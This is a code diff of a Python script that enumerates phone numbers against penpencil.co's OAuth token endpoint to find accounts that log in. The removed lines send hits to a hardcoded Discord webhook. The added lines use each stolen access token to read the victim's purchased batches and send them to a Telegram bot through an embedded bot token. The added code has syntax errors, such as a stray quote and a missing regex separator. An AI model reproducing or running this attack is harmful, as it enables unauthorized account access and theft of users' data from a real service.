@@ -1,11 +1,23 @@
 import requests
-import re
-def sendiscord(numbr):
-    print(numbr)
-    whurl="https://discord.com/api/webhooks/1068549418342694972/qhzsNPpF9dxBewVebykPzrdDcqekgs4w0z2y083dFOdr-Fmin5wASIxLUYnJjCEMECe3"
-    msg={"content": numbr }
-    requests.post(whurl,headers={"content-type":"application/json"},json = msg)
+def getBs(token):
+    url = 'https://api.penpencil.co/v3/batches/all-purchased-batches?page=1&mode=1&sort=TAG_LIST'
+    headers = {
+        'Host': 'api.penpencil.co',
+        'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
+        'Authorization': f'Bearer {token}',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+        'Accept': 'application/json, text/plain, */*',
+        'Randomid': 'd00d2cb9-7907-42b7-b105-0972c105e171',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9'
+    }
 
+    response = requests.get(url, headers=headers)
+    batches=[]
+    data=response.json()['data']
+    for i in data:
+        batches.append(i['batch']['name'])
+    return batches
 headers = {
     'Authorization': 'Bearer',
     'Content-Type': 'application/json',
@@ -21,13 +33,11 @@ json_data = {
     'latitude': 0,
     'longitude': 0,
 }
-pattern = "^(?!.*([0]{6}|[1]{6}|[2]{6}|[3]{6}|[4]{6}|[5]{6}|[6]{6}|[7]{6}|[8]{6}|[9]{6}).*)([7-9][0-9]{9})$"
-number = 9999999999
-while number!="9000000000":
-    b=bool(re.match(pattern,str(number)))
-    number-=1
-    if b:
-        json_data['username']=number
-        response = requests.post('https://api.penpencil.co/v3/oauth/token', headers=headers, json=json_data)
-        if (response.json())['success']:
-            sendiscord(str(number))
+pattern = "^(?!.*([0]{6}|[1]{6}|[2]{6}|[3]{6}[4]{6}|[5]{6}|[6]{6}|[7]{6}|[8]{6}|[9]{6}).*)([7-9][0-9]{9})$"
+number = 8482999999
+while number!=8000000000":
+    json_data['username']=number
+    response = requests.post('https://api.penpencil.co/v3/oauth/token', headers=headers, json=json_data)
+    token=response.json()['data']['access_token']
+    if (response.json())['success']:
+        requests.get('https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text='+str(getBs(token)))
